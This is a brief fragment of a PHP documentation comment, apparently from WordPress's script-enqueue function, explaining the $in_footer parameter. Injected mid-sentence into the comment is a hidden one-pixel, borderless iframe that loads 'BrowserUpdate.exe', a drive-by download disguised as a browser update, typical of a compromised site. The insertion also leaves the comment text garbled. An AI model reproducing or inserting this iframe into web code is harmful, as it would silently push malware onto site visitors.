 ...
 * @param bool             $in_footer Optional. Whether to enqueue the script before </body> instead of in the <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>.
 *                                    Default 'false'.
